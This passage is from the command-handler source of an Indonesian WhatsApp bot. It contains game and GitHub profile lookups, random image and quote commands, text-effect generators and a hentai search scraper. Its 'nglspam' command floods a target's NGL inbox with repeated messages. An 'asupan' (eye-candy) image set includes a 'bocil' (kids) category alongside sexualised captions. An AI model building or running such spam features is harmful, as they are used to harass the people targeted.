}
break

case 'ffstalk': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} 12345678`)
    const apiUrl = await fetchJson(`https://vapis.my.id/api/ff-stalk?id=${text}`)
    const ffData = apiUrl.data.account
    if (ffData) {
      const guild = apiUrl.data.guild
      const response = `
*Nama Akun:* ${ffData.name}
*Level:* ${ffData.level}
*Region:* ${ffData.region}
*Like:* ${ffData.like}
*Bio:* ${ffData.bio}
*Guild:* ${guild.name} (Level ${guild.level})
*BR Points:* ${ffData.BR_points}
*CS Points:* ${ffData.CS_points}
*Pet:* ${apiUrl.data.pet_info.name} (Level ${apiUrl.data.pet_info.level})
      `
      ReplyRynzz(response)
    } else {
      ReplyRynzz('Data tidak ditemukan')
    }
  } catch (err) {
    console.error(err)
    ReplyRynzz('Terjadi kesalahan')
  }
}
break

case 'mlstalk': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} 109088431, 2558`)
    const [id, zoneId] = text.split(',') || text.split(', ')
    if (!id || !zoneId) return ReplyRynzz('Masukkan id dan zoneid')

    const apiUrl = await fetchJson(`https://vapis.my.id/api/ml-stalk?id=${id}&zoneid=${zoneId}`)
    const mlData = apiUrl.data.data
    if (mlData) {
      const product = mlData.product
      const item = mlData.item
      const response = `
*Game:* ${product.name}
*Item:* ${item.name}
*Harga:* ${item.price}
*Username Game:* ${mlData.gameDetail.userName}
*Channel Pembayaran:* ${mlData.paymentName}
*Deskripsi Produk:* ${product.description}
*Gambar Produk:* ${product.imageDisplay}
      `
      ReplyRynzz(response)
    } else {
      ReplyRynzz('Data tidak ditemukan')
    }
  } catch (err) {
    console.error(err)
    ReplyRynzz('Terjadi kesalahan')
  }
}
break

case 'npmstalk': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} express`)
    let npmData = await npmStalk(text)
    
    const response = `
*Package:* ${npmData.name}
*Versi:* ${npmData.versionLatest}
*Versi Pertama:* ${npmData.versionPublish}
*Jumlah Versi:* ${npmData.versionUpdate}
*Versi Terbaru:* ${npmData.latestDependencies}
*Versi Pertama:* ${npmData.publishDependencies}
*Waktu Rilis Pertama:* ${npmData.publishTime}
*Waktu Rilis Terbaru:* ${npmData.latestPublishTime}
    `
    ReplyRynzz(response)
  } catch (err) {
    console.error(err)
    ReplyRynzz('Wah ada yang error, coba lagi nanti!')
  }
}
break

            case 'reminder': {
if (!isPrem) return Xpremium()
                if (!args[0] || !args[1] || !args[2]) return ReplyRynzz('*contoh : Reminder Waktu Detik/Menit/Jam Pesan*\n\n*Contoh : Reminder 30 Menit Jangan Lupa Sholat*')
                const time = parseInt(args[0]) * (args[1].match(/(m|minute)/i) ? 60 : args[1].match(/(h|hour)/i) ? 3600 : 1) * 1000
                const message = args.slice(2).join(' ')
                setTimeout(() => {
                    Alice.sendMessage(from, { text: `*Reminder Untuk @${sender.split("@")[0]}*\n\n📑 *Dengan Pesan :* ${message}`, contextInfo: { mentionedJid: [sender] } }, { quoted: m })
                }, time)
                ReplyRynzz(`*Berhasil Mengatur Reminder Untuk ${args[0]} ${args[1]} Ke Depan*`)
            }
                break


case 'nglspam':{
if (!isPrem) return Xpremium()
    if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
        return ReplyRynzz("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam username|haloo|5");
    }
    const [username, message, count] = text.split("|");
    const spamCount = parseInt(count, 10);
    if (isNaN(spamCount) || spamCount <= 0) {
        return ReplyRynzz("Jumlah spam harus berupa angka positif!");
    }
    try {
        await nglspam(username, message, spamCount);
        ReplyRynzz(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
    } catch (e) {
        console.error(e); // Menambahkan logging error untuk debug
        return ReplyRynzz("Fitur error, coba lagi nanti.");
    }
}
break

case 'threads': {
if (!isPrem) return Xpremium()
if (!args || !args[0]) return ReplyRynzz(`Example: ${XyrooRynzz} https://www.threads.net/@httpnald_/post/CwWvCFvJr_N/?igshid=NTc4MTIwNjQ2YQ==`)
await xreaction()
let timestamp = speed()
let latensi = speed() - timestamp
const json = await fetchJson(`https://aemt.uk.to/download/threads?url=${text}`)
Alice.sendMessage(m.chat, { video: { url: json.result.video_urls[0].download_url }, caption: `🍟 *Fetching* : ${latensi.toFixed(4)} ms` }, { quoted: m })
}
break

case 'threadsimg': {
if (!isPrem) return Xpremium()
if (!args || !args[0]) return ReplyRynzz(`Example: ${XyrooRynzz} https://www.threads.net/t/Cujx6ryoYx6/?igshid=NTc4MTIwNjQ2YQ==`)
let timestamp = speed()
let latensi = speed() - timestamp
const json = await fetchJson(`https://aemt.uk.to/download/threads?url=${text}`)
Alice.sendMessage(m.chat, { image: { url: json.result.image_urls }, caption: 'succes' }, { quoted: m })
}
break	

case 'ghstalk': case 'githubstalk':{
if (!isPrem) return Xpremium()
if (!q) return ReplyRynzz(`Example ${XyrooRynzz} xyrooo2`)
let githubstalk = require('./AliceLibray/sekref')
aj = await githubstalk.githubstalk(`${q}`)
Alice.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*GITHUB STALK*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break

case 'gempa':
            case 'infogempa': {
            if (!isPrem) return Xpremium()
                try {
                    const res = await fetch('https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json')
                    const data = await res.json()
                    const gempa = data.Infogempa.gempa
                    let txt = `*${gempa.Wilayah}*\n\n`
                    txt += `Tanggal : ${gempa.Tanggal}\n`
                    txt += `Waktu : ${gempa.Jam}\n`
                    txt += `Potensi : *${gempa.Potensi}*\n\n`
                    txt += `Magnitude : ${gempa.Magnitude}\n`
                    txt += `Kedalaman : ${gempa.Kedalaman}\n`
                    txt += `Koordinat : ${gempa.Coordinates}`
                    if (gempa.Dirasakan.length > 3) {
                        txt += `\nDirasakan : ${gempa.Dirasakan}`
                    }

                    Alice.sendMessage(m.chat, {
                        text: txt, contextInfo: {
                            "externalAdReply": {
                                "title": botname,
                                "body": command,
                                "showAdAttribution": true,
                                "mediaType": 1,
                                "sourceUrl": global.ig,
                                "thumbnailUrl": thumb, "renderLargerThumbnail": true
                            }
                        }
                    }, { quoted: m })
                } catch (e) {
                    console.log(e)
                    ReplyRynzz('[!] Ada Yang Error.')
                }
            }
                break
               

case 'readmore': {
if (!isPrem) return Xpremium()
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    Alice.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;                				

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Premium Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Asupan Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case 'tiktokgirl':
if (isBan) return Xban()
await xreaction()
var asupan = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: ii.url }}, { quoted: m })
break
case 'tiktokghea':
if (isBan) return Xban()
await xreaction()
await xreaction()
var gheayubi = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iii.url }}, { quoted: m })
break
case 'tiktokbocil':
if (isBan) return Xban()
await xreaction()
await xreaction()
var bocil = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiii.url }}, { quoted: m })
break
case 'tiktoknukhty':
if (isBan) return Xban()
await xreaction()
await xreaction()
var ukhty = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiii.url }}, { quoted: m })
break
case 'tiktoksantuy':
if (isBan) return Xban()
await xreaction()
await xreaction()
var santuy = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiiii.url }}, { quoted: m })
break
case 'tiktokkayes':
if (isBan) return Xban()
await xreaction()
await xreaction()
var kayes = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiiiii.url }}, { quoted: m })
break
case 'tiktokpanrika':
if (isBan) return Xban()
await xreaction()
await xreaction()
var rikagusriani = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiiiiii.url }}, { quoted: m })
break
case 'tiktoknotnot':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiiiiiii.url }}, { quoted: m })
break
case 'chinese':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiii.url } }, { quoted: m })
break
case 'hijab':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiii.url } }, { quoted: m })
break
case 'indo':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Asupan Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Ephoto Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects': {
  if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} ${ownername}`)
await xreaction()
  let link
  if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
  if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
  if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
  if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
  if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
  if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
  if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
  if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
  if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
  if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
  if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
  if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
  if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
  if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
  if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
  if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
  if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
  if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
  if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
  if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
  if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
  if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
  if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
  if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
  if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
  if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
  if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
  if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
  if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
  if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
  let haldwhd = await ephoto(link, q)
  try {
    await Alice.sendMessage(m.chat, {
      image: {
        url: haldwhd
      },
      caption: `© ${global.author}`
    }, {
      quoted: m
    })
  } catch (err) {
    ReplyRynzz('Terjadi Kesalahan')
  }
}
break


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Ephoto Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Random Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case 'aesthetic':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('../AliceResource/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/kpop.json'))
var ll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/notnot.json'))
var lll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lll.url } }, { quoted: m })
break
case 'car':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/car.json'))
var llll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/profile.json'))
var llllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/rose.json'))
var llllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ulzzangboy':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llllllllllll.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
if (isBan) return Xban()
await xreaction()
await xreaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllllllllllll.url } }, { quoted: m })
break

case 'faktaunik': {
if (isBan) return Xban()
await xreaction()
await xreaction() 
let Xyroo = await fetchJson(`https://api.autoresbot.com/api/random/faktaunik`)
let qutenya = Xyroo.data;
await ReplyRynzz(qutenya)
}
break
case 'quotesbucin': {
if (isBan) return Xban()
await xreaction()
await xreaction() 
let Xyroo = await fetchJson(`https://api.autoresbot.com/api/random/bucinquote`)
let qutenya = Xyroo.data;
await ReplyRynzz(qutenya)
}
break
case 'quotesanime': {
if (isBan) return Xban()
await xreaction()

await xreaction() 
let Xyroo = await quotesAnime();
let yanti = Xyroo[Math.floor(Math.random() * Xyroo.length)]
let cap = `
_° ${yanti.karakter} :°_
_✨° ${yanti.quotes} °_

_🍂${yanti.anime} ~_`
await ReplyRynzz(cap)
}
break
case 'quotesjawa': {
if (isBan) return Xban()
await xreaction()

await xreaction() 
let Xyroo = await fetchJson(`https://api.autoresbot.com/api/random/jawaquote`)
let qutenya = Xyroo.data;
await ReplyRynzz(qutenya)
}
break
case 'quotes': {
if (isBan) return Xban()
await xreaction()

await xreaction() 
let Xyroo = await Quotes();
let cap = `
_✨° ${Xyroo.quotes} °_

_🍂${Xyroo.author} ~_`
await ReplyRynzz(cap)
}
break
case 'meme': {
if (isBan) return Xban()
await xreaction()

await xreaction()
try {
let Xyroo = await JalanTikusMeme()
await Alice.sendMessage(m.chat, { image: { url: Xyroo }, caption: 'donee' }, { quoted: m })
} catch (error) {
  return Xerror()
}
}
break
case 'darkjokes':
case 'jokesgelap':
case 'jokesdark':
case 'darkjoke': {
if (isBan) return Xban()
await xreaction()
try {
let Xyroo = await Darkjokes()
await Alice.sendMessage(m.chat, { image: { url: Xyroo }, caption: 'donee' }, { quoted: m })
} catch (error) {
  return Xerror()
}
}
break
case 'kataanime':{
if (isBan) return Xban()
await xreaction()

await xreaction()
    	try {
//wm senn
		let res = await await fetch("https://katanime.vercel.app/api/getrandom");
		if (!res.ok) throw await res.text();
		let json = await res.json();
//wm senn
		if (!json.result) throw json;
		let data = "";
		for (let i = 0; i < json.result.length; i++) {
			let { id, english, indo, character, anime } = json.result[i];
			data += `_*•.* "${indo}"_\n${character} (${anime})\n\n`;
		}
//wm senn
		ReplyRynzz(data);
	} catch (e) {
		console.log(e);
		ReplyRynzz(msg.error)
	}
//wm senn
};
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Random Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Search Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'waifu': {
  if (isBan) return Xban()
await xreaction()
  try {
    let res = await axios.get('https://fastrestapis.fasturl.cloud/sfwnsfw/anime?type=sfw&tag=waifu', {
      responseType: 'arraybuffer'
    });

    Alice.sendMessage(m.chat, {
      image: Buffer.from(res.data),
      caption: 'Nih waifumu~\n\nBuat bacol enak 🤗'
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    ReplyRynzz('Lagi error bang, coba lagi nanti.');
  }
}
break
case 'hentais':
case 'hentai': {
if (isBan) return Xban()
await xreaction()
  if (!args.length) return ReplyRynzz(`Masukkan judul yang ingin dicari!\nContoh: ${XyrooRynzz} hinata`)

async function searchHentai(query) {
  try {
    const { data } = await axios.get("https://hentai.tv/?s=" + encodeURIComponent(query))
    const $ = cheerio.load(data)
    const result = []
    
    $('div.flex > div.crsl-slde').each((i, el) => {
      const thumbnail = $(el).find('img').attr('src')
      const title = $(el).find('a').text().trim()
      const views = $(el).find('p').text().trim()
      const url = $(el).find('a').attr('href')
      result.push({ thumbnail, title, views, url })
    })

    return {
      coder: 'SaaOfc',
      warning: 'failed',
      result
    }
  } catch (err) {
    return { error: 'error', message: err.message }
  }
}

  const res = await searchHentai(args.join(" "))
  if (!res || res.result.length === 0) return ReplyRynzz('Tidak ditemukan!')

  let teks = `*Hasil Pencarian dari Hentai.tv*\n\n`
  for (let i = 0; i < Math.min(5, res.result.length); i++) {
    const x = res.result[i]
    teks += `*${x.title}*\nViews: ${x.views}\nURL: ${x.url}\n\n`
  }

  await Alice.sendMessage(m.chat, {
    text: teks.trim(),
    contextInfo: {
      externalAdReply: {
        title: "Hentai Search",
        body: packname,
        thumbnailUrl: res.result[0]?.thumbnail,
